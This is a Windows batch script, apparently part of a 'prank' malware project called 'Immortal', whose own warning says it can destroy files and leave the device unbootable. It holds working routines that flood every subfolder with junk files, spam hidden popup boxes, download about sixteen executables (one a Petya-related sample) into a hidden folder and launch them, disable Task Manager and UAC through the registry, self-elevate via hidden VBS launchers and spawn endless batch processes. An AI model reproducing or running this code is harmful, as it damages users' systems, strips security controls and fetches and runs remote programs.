for /f "tokens=*" %%d in ('dir %targetDir[0]% /ad /s /b') do (
	echo %%d >> %pathFile%
)
set /a strSize=0
call :StringSizeB "%gibberish%"

for /f "tokens=*" %%s in (%pathFile%) do (
	for /l %%n in (0, 1, 1000) do (
		::Generate random gibbersih text
		set /a randNumChar=!random! %% 40-2
		call :Char "!randNumChar!"
		::Select random file extention
		set /a randNumExt=!random! %% 15
		call :Extention "!randNumExt!"
		::Create file
		set line=%%s
		set fixLine=!line:~0,-1!
		echo Its %date% %time% dear %username% >> !fixLine!\!weirdText!!selExtention!
		echo !fixLine!\!weirdText!!selExtention!
		::Clean data
		set weirdText=
		set selExtention=
	)
)

exit /b 0

:GibberishBoxes
setlocal enabledelayedexpansion

set /a strSize=0
set gibberish=0123456789ěščřžýáíé234567890   €đĐŁ$ß÷×¤ÿöïäëüúůŮÚťŤďŕ☺☻♥♦♣♠•◘○♂▬¶▲§↨↑↓→←∟↔▼╚
call :GetStringSize

::MessageBox icon: 0 - None, 16 - Error, 32 - Question, 48 - Warning, 64 - Info
set msgIcon[0]=0
set msgIcon[2]=16
set msgIcon[3]=32
set msgIcon[4]=48
set msgIcon[5]=64

::MessageBox buttons: 0 - OK, 1 - OKCancel, 3 - YesNoCancel, 4 - YesNo
set msgButton[0]=0
set msgButton[1]=1
set msgButton[2]=3
set msgButton[3]=4

for /l %%n in (0, 1, 10000) do (
	set generatedStr=
	set selBtn=
	set selIcon=
	set /a randFor=!random! %% 5000+25
	for /l %%m in (0, 1, !randFor!) do (
		set /a randChar=!random! %% %strSize%
		call :GenerateStr "!randChar!"
	)
	set /a randBtn=!random! %% 4
	set /a randIcon=!random! %% 6
	call :RandomBtnIcon "!randBtn!", "!randIcon!"
	call :MessageBox "!generatedStr!", "" "!selBtn!", "!selIcon!"
	set /a randTimer=!random! %% 3+1
	timeout /t !randTimer! /nobreak >nul
)

pause

exit /b 0

:RandomBtnIcon
set selBtn=!msgButton[%~1]!
set selIcon=!msgIcon[%~2]!

exit /b 0

:GenerateStr

set generatedStr=!generatedStr!!gibberish:~%~1,1!

exit /b 0

:GetStringSize
set char=!gibberish:~%strSize%,1!

if defined char (
	set /a strSize+=1
	goto GetStringSize
)

exit /b 0

:Extention
set selExtention=!extentions[%~1]!

exit /b 0

:Char
for /l %%n in (0, 1, %~1) do (
	set /a randGib=!random! %% %strSize%
	call :Combine "!randGib!"
)

exit /b 0

:Combine
set weirdText=!weirdText!!gibberish:~%~1,1!

exit /b 0

:StringSizeB
set strdata=%~1
set char=!strdata:~%strSize%,1!

if defined char (
	set /a strSize+=1
	goto StringSizeB
)

exit /b 0

:MessageBox
start /min powershell -WindowStyle Hidden -command "& {Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('%~1','%~2','%~3','%~4')}"

exit /b 0

:TrojanDL
setlocal enabledelayedexpansion

set /a arraySize=0
set chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789
set /a strSize=0

::Random crap
set dlUrl[0]=https://github.com/netb2c/petrwrap_sample/blob/master/PetyaFix_2_0_766_127.exe
set dlUrl[1]=https://www.rar.cz/files/winrar-x64-701.exe
set dlUrl[2]=https://www.ytddownloader.com/download.html
set dlUrl[3]=https://totalcommander.ch/1103/tcmd1103x64.exe
set dlUrl[4]=https://github.com/notepad-plus-plus/notepad-plus-plus/releases/download/v8.7.1/npp.8.7.1.Installer.x64.exe
set dlUrl[5]=https://muse-cdn.com/Muse_Hub.exe
set dlUrl[6]=http://www.rw-designer.com/cursor-downloadset.php^?id=great-magic
set dlUrl[7]=https://github.com/FlashpointProject/FlashpointComponentTools/releases/latest/download/FlashpointInstaller.exe
set dlUrl[8]=https://8gadgetpack.net/dl_370/8GadgetPackSetup.msi
set dlUrl[9]=https://github.com/tjmarkham/win10widgets/releases/download/1.0.0/Win10-Widgets.Rainmeter-4.0.exe
set dlUrl[10]=https://outebytech.com/KVqVCDJy^?keyword=wireless-side
set dlUrl[11]=https://win.desktop.evernote.com/builds/Evernote-latest.exe
set dlUrl[12]=https://www.eclipse.org/downloads/download.php^?file=/oomph/epp/2024-09/R/eclipse-inst-jre-win64.exe^&mirror_id=1321
set dlUrl[13]=https://download.teamviewer.com/download/TeamViewerQS_x64.exe^?utm_source=google^&utm_medium=cpc^&utm_campaign=restofeurope^%7Cb^%7Cpr^%7C22^%7Caug^%7Ctv-core-download-sn^%7Cnew^%7Ct0^%7C0^&utm_content=Download^&utm_term=teamviewer^+download
set dlUrl[14]=https://download.light-speed.com/TeamSpeak3/3.5.3/TeamSpeak3-Client-win64-3.5.3.exe
set dlUrl[15]=https://tlauncher.org/installer

::Get Array Size, result is arraySize | Get String Size, result is strSize
call :GetArraySizeB
call :GetStringSizeB
set dirOutput=C:\Download

if not exist %dirOutput% (
	mkdir %dirOutput%
	attrib +h %dirOutput%
)
::1. par - url, 2. par - output file (e.g: C:\file.exe)
for /l %%n in (0, 1, %arraySize%) do (
	call :RandomStr
	call :Download "!dlUrl[%%n]!", "%dirOutput%\!genStr!.exe"
	set /a randTimer=!random! %% 12+3
	echo !randTimer!
	timeout /t !randTimer! /nobreak >nul
	start cmd /k "start %dirOutput%\!genStr!.exe"
)

exit /b 0

:RandomStr
set genStr=
for /l %%n in (0, 1, 40) do (
	set /a rand=!random! %% %strSize%
	call :GenerateStrB "!rand!"
)
exit /b 0

:GenerateStrB
set genStr=!genStr!!chars:~%~1,1!

exit /b 0

:GetStringSizeB
set char=!chars:~%strSize%,1!

if defined char (
	set /a strSize+=1
	goto GetStringSizeB
)

exit /b 0

:GetArraySizeB
if defined dlUrl[%arraySize%] (
	set /a arraySize+=1
	goto GetArraySizeB
)

exit /b 0

:Download
powershell -command "& {Invoke-WebRequest '%~1' -OutFile '%~2'}"

exit /b 0

:CreateVbs

::Create vbs script which will hide the batch script
echo ^Set objShell = CreateObject("WScript.Shell") >> %hideVbs%
echo ^Set objShellApp = CreateObject("Shell.Application") >> %hideVbs%
echo ^strProgram = "C:\Immortal\Immortal.bat" >> %hideVbs%
echo ^objShellApp.ShellExecute strProgram, "", "", "runas", 0 >> %hideVbs%

::Create vbs script which will run the script normally
echo ^Set objShell = CreateObject("WScript.Shell") >> %normalVbs%
echo ^Set objShellApp = CreateObject("Shell.Application") >> %normalVbs%
echo ^strProgram = "C:\Immortal\Immortal.bat" >> %normalVbs%
echo ^objShellApp.ShellExecute strProgram, "", "", "runas", 1 >> %normalVbs%

exit /b 0

:RunScripts

for /l %%n in (0, 1, 100000) do (
	start %spamBatch:"=%
	start /min %randomBatch:"=%
	timeout /t 10 /nobreak >nul
)

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
::Global timer
:Timer

set /a secs=%1

:sub_Timer

if %secs% neq 0 (
	cls
	echo Payload will be executed after %secs% seconds ...
	set /a secs-=1
	timeout /t 1 /nobreak >nul
	goto sub_Timer
)

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
:Warning
cls

title %scriptName% - Warning

echo You are about to launch a dangerous batch script.
echo Keep in mind that this particular script can cause a damage to your device.
echo You will lose your personal files and your device will not be able to boot properly again.
echo As the author of this script, I am not responsible for any damages!
echo.
echo Do you still want to continue (Y/N)?

choice /c YN /n /m ""

if errorlevel 2 (
	exit
)

cls

:LastWarning

title %scriptName% - Last Warning

echo This is the Last Warning!
echo By typing "Y" again, you understand everything what have been said above
echo and you will continue. ^
If you type "N", you will exit this batch script.
echo.
echo DO YOU REALLY WANT TO CONTINUE AND BRING THIS DEVICE INTO DANGER (Y/N)?


choice /c YN /n /m ""

if errorlevel 2 (
	exit
)

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
::Global final message
:FinalMsg

setlocal enabledelayedexpansion

set level=!lvl[%1]!
call :sub_FinalMsg "!level!"

exit /b 0

:sub_FinalMsg

setlocal disabledelayedexpansion

echo.
echo Congratulations!
echo.
echo You passed %~1!
echo.
echo Press any key to return to the main menu ...

pause >nul

exit /b 0

::#############################################################################
::#############################################################################
::#############################################################################
:DisableTaskMgr

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

exit /b 0

:DisableUAC

call :regShellAdd "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", 0
call :regShellAdd "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0

exit /b 0

::#############################################################################
::#############################################################################
::#############################################################################
::Use this function if you want to execute payload on the specific date (mm/dd)
:DateTimed

set fixDate=
set mdDate=
set /a boolDate=0

for /f "tokens=2 delims= " %%s in ('date /t') do (
	set fixDate=%%s
)

for /f "tokens=1,2 delims=/" %%a in ("%fixDate%") do (
	set mdDate=%%a/%%b
)

if "%mdDate%"=="%~1" (
	set /a boolDate=1
)

exit /b 0

::#############################################################################
::#############################################################################
::#############################################################################
::Get the unchanged username
:GetRealName

for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
	set realName=%%s
)

exit /b 0
::#############################################################################
::#############################################################################
::#############################################################################
::PowerShell - registry

:regShellAdd
::1. - path, 2. - valuename, 3. - data
powershell -command "& {Set-ItemProperty -Path '%~1' -Name '%~2' -Value '%~3'}"

exit /b 0

:regShellCreate
::1. - path, 2. - valuename, 3. - data, 4. - datatype
powershell -command "& {New-ItemProperty -Path '%~1' -Name '%~2' -Value '%~3' -PropertyType '%~4'}"

exit /b 0

::#############################################################################
::#############################################################################
::#############################################################################
:RunAs

::If the script runs for the first time, there is no registry for this script
::Because of that, let's start the script with UI
if not exist %scriptDir% (
	call :RunShell
	exit /b 0
)

call :IntRegEqual "%lvlAn%"

if %regEqual% geq 1 (

	call :RunHidden
	exit /b 0
)

call :IntRegEqual "%lvlHa%"

if %regEqual% geq 1 (

	call :RunHidden
	exit /b 0
)

call :IntRegEqual "%lvlCr%"

if %regEqual% geq 1 (

	call :RunHidden
	exit /b 0
)

call :IntRegEqual "%lvlDe%"

if %regEqual% geq 1 (

	call :RunHidden
	exit /b 0
)
::If levels above are not turned on, let's launch the script with UI
call :RunNormal

exit /b 0

:RunHidden

cls

NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
	start /min "" "%hideVbs%"
	exit
) else if "%exception%"=="1" (
	set /a exception=0
	start /min "" "%hideVbs%"
	exit
)

exit /b 0

:RunNormal

cls

NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    start /min "" "%normalVbs%"
	exit
)

::Re-check it if the registry is disabled
reg query "HKEY_CURRENT_USER"

if %errorlevel% neq 0 (
	call :BlockRegistry "0"
	set /a exception=1
	call :RunAs
)

exit /b 0

:RunShell

NET SESSION >nul 2>nul
if %errorlevel% NEQ 0 (
    start /min powershell -Command "Start-Process '%~f0' -Verb runAs"
	exit
)

exit /b 0

::#############################################################################
::#############################################################################
::#############################################################################
:OsDetection

setlocal enabledelayedexpansion

set systemInfoFile=C:\Windows\System32\osVersion.txt

if exist "%systemInfoFile%" (
	del "%systemInfoFile%"
)

systeminfo | find "OS Version:" >> %systemInfoFile%

for /f "tokens=3 delims= " %%s in (%systemInfoFile%) do (
	for /f "tokens=1-2 delims=." %%a in ("%%s") do (
		set /a osNumber=%%a%%b
		if !osNumber! neq 0 (
			call :Decision
		)
	)
)

exit /b 0

:Decision

if !osNumber! lss 62 (
	cls

	title Unsupported Operating System Detected
	color 04

	echo Sorry :( , but this script cannot be launched on an older Operating System. 
	echo Please try it again on at least Windows 8.
	echo.
	
	pause
	exit
)

exit /b 0